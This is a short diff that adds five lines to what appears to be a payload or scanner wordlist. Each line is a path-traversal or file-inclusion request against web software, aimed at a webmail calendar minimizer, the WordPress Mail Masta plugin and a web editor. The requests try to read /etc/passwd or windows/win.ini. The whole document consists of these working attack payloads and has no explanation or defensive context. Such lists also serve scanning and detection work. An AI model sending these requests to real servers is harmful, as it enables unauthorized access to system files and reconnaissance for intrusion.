@@ -1,0 +1,5 @@
+/webmail/old/calendar/minimizer/index.php?script=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd
+/webmail/old/calendar/minimizer/index.php?style=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd
+/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd
+/webeditor/../../../windows/win.ini
